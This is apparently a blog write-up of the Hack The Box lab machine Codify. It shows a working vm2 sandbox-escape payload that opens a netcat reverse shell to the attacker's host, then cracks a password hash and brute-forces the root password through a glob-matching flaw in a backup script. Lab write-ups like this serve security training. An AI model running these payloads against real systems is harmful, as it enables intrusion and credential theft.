---
author: 0xbinder
layout: post
title: Codify - HTB Machine
date: '2023-11-07'
description: "Codify is an easy linux machine from HTB"
categories: [Hack The Box]
---

## MACHINE INFO

> **[Codify](https://app.hackthebox.com/machines/Codify)** is an easy linux machine which leverages a CVE on `vm2` and the knowledge of `javascript` inorder to create a script for a reverse shell and the basic of any scripting language such as `python` to create a custom script for privilege escalation through bruteforce attack.

## ENUMERATION

```bash
nmap -sV -sC -top-ports 100 10.10.11.239
```

```bash
Nmap scan report for 10.10.11.239
Host is up (0.79s latency).
Not shown: 97 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.78 seconds
```

We add the ip to our hosts file 
```bash
echo '10.10.11.239 codify.htb' | sudo tee -a /etc/hosts
```
The website allows us to run javascript code

![img-description](1.png)

We notice the website uses vm2

![img-description](2.png)

After searching for the exploits on vm2 i came across this [CVE-2023-37466](https://github.com/advisories/GHSA-cchq-frgv-rjh5) that allows RCE

We craft our payload to create [netcat bind and reverse shells](https://patchthenet.com/blog/create-bind-and-reverse-shells-using-netcat/) to connect with netcat

```javascript
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.178 4242 >/tmp/f');
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code));
```

We then listen on our machine for connections

```bash
sudo nc -lnvp 4242
```

We run the code and immediately "WE ARE IN". We move to var/www/ and find a directory ```contact```. We move into the directory and find ```tickets.db```
```bash
$ cd var/www/  
$ ls
contact
editor
html
$ cd contact
$ ls
index.js
package.json
package-lock.json
templates
tickets.db
```

We use sqlite3 to get the data in users table. We find a user joshua with a hash 
```bash
$ sqlite3 tickets.db
.tables
tickets  users  
select * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

We crack the hash with john and find the password ```spongebob1```
```bash
john --wordlist=/usr/share/dict/rockyou.txt hash.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Use the "--format=bcrypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (?)
1g 0:00:01:11 DONE (2023-11-07 11:45) 0.01399g/s 19.14p/s 19.14c/s 19.14C/s crazy1..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We connect with ssh to the machine
```bash
ssh joshua@10.10.11.239
password: spongebob1
```

## PRIVILEGE ESCALATION
We notice a script running at ```/opt/scripts/mysql-backup.sh```. The script allows us to guess the password endless times
```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```
We create a python script to bruteforce the password of the root
```python
import string
import subprocess
all = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
```

```bash
joshua@codify:/tmp$ python3 brute.py
[sudo] password for joshua: 
k
kl
klj
kljh
kljh1
kljh12
kljh12k
kljh12k3
kljh12k3j
kljh12k3jh
kljh12k3jha
kljh12k3jhas
kljh12k3jhask
kljh12k3jhaskj
kljh12k3jhaskjh
kljh12k3jhaskjh1
kljh12k3jhaskjh12
kljh12k3jhaskjh12k
kljh12k3jhaskjh12kj
kljh12k3jhaskjh12kjh
kljh12k3jhaskjh12kjh3
```
We switch to root and enter the password. We are now r00t
```bash
joshua@codify:/tmp$ su
Password: 
root@codify:/tmp#
```

<!-- ![img-description](3.png) -->
